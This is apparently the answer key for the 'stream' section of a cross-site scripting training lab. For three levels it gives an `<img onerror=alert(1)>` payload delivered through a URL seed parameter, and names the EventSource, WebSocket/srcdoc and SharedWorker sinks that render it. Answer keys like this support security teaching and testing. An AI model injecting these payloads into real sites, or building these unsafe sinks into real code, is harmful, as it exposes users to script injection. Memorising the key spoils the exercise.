# stream — solutions

Streaming sinks (EventSource / WebSocket / SharedWorker) where seed is dispatched to a message handler that hits innerHTML, srcdoc, or createContextualFragment.

### stream-level1

`/stream/level1/?seed=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: EventSource message handler innerHTMLs `event.data` (seed dispatched directly)

### stream-level2

`/stream/level2/?seed=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: WebSocket message JSON-wrapped; html field placed into iframe srcdoc

### stream-level3

`/stream/level3/?seed=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: SharedWorker relays seed to createContextualFragment then appendChild
